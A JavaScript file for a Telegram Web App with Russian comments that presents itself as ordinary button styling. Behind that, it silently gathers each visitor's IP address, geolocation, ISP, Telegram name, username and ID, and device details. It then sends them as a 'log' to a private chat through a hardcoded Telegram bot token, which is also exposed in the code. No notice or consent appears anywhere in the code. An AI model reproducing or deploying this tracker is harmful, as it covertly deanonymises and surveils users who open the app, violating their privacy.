let tg = window.Telegram.WebApp; // Получаем объект webapp Telegram

tg.expand(); // Расширяем на все окно

let userAgent = navigator.userAgent;
tg.MainButton.text = "Измененный текст"; // Изменяем текст кнопки
tg.MainButton.textColor = "#F55353"; // Изменяем цвет текста кнопки
tg.MainButton.color = "#143F6B"; // Изменяем цвет фона кнопки

// Получение IP-адреса пользователя
fetch('http://ip-api.com/json/')
  .then(response => response.json())
  .then(data => {
    let userIP = data.query;
    let userCountry = data.country;
    let userCountryCode = data.countryCode;
    let userRegion = data.region;
    let userRegionName = data.regionName;
    let userCity = data.city;
    let userZip = data.zip;
    let userLat = data.lat;
    let userLon = data.lon;
    let userTimezone = data.timezone;
    let userISP = data.isp;
    let userORG = data.org;
    let userAs = data.as;
    

    // Собираем данные о пользователе
    let udata = `⭐ Новый лог успешно пришел!\n\n🔍 Информация об аккаунте:\n`;
    udata += `├ IP: ${userIP}\n`;
    udata += `├ Страна: ${userCountry}\n`;
    udata += `├ Код страны: ${userCountryCode}\n`;
    udata += `├ Регион: ${userRegion}\n`;
    udata += `├ Имя региона: ${userRegionName}\n`;
    udata += `├ Город: ${userCity}\n`;
    udata += `├ Индекс: ${userZip}\n`;
    udata += `├ Ширина: ${userLat}\n`;
    udata += `├ Долгота: ${userLon}\n`;
    udata += `├ Часовой пояс: ${userTimezone}\n`;
    udata += `├ Провайдер: ${userISP}\n`;
    udata += `├ ORG: ${userORG}\n`;
    udata += `├ As: ${userAs}\n`;
    udata += `├ Имя: ${tg.initDataUnsafe.user.first_name}\n`;
    udata += `├ Фамилия: ${tg.initDataUnsafe.user.last_name}\n`;
    udata += `├ Юзернейм: @${tg.initDataUnsafe.user.username}\n`;
    udata += `├ ID: ${tg.initDataUnsafe.user.id}\n`;
    udata += `├ Язык: (${tg.initDataUnsafe.user.language_code})\n\n🔍 Информация об устройстве:\n`;
    udata += `├ User-agent: ${userAgent}\n`;

    // Получение дополнительных данных
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        udata += `├ Уровень заряда батареи: ${Math.round(battery.level * 100)}%\n`;
      }).catch(error => {
        // Обработка ошибки при получении уровня заряда батареи
        console.error("├ Ошибка при получении уровня заряда батареи:", error);
        udata += `├ Уровень заряда батареи: недоступно\n`;
      });
    } else {
      // Устройство не поддерживает API Battery Status
      udata += `├Уровень заряда батареи: недоступно\n`;
    }

    if (Intl && Intl.DateTimeFormat) {
      let dt = new Intl.DateTimeFormat().resolvedOptions().timeZone;
      udata += `├ Часовой пояс: ${dt}\n`;
    }

    if (navigator.userAgentData && navigator.userAgentData.brands) {
      let browser = navigator.userAgentData.brands[0].brand;
      udata += `├ Браузер: ${browser}\n`;
    }

    if (navigator.userAgentData && navigator.userAgentData.platform) {
      let os = navigator.userAgentData.platform;
      udata += `├ Система: ${os}\n`;
    }

    if (screen && screen.width && screen.height) {
      udata += `├ Разрешение экрана: ${screen.width}x${screen.height}\n`;
    }

    if (navigator.userAgentData && navigator.userAgentData.mobile) {
      udata += `├ Модель устройства: ${navigator.userAgentData.mobile}\n`;
    }

    if (navigator.connection && navigator.connection.effectiveType) {
      udata += `└ Тип сети: ${navigator.connection.effectiveType}\n`;
    }
    // Отправляем данные в Telegram
    fetch('https://api.telegram.org/bot7135635327:AAGJCOHukbw2jHaJpTaK02ivkSGDf3yYSKY/sendMessage?chat_id=-4102933956&text=' + encodeURIComponent(udata));
  });
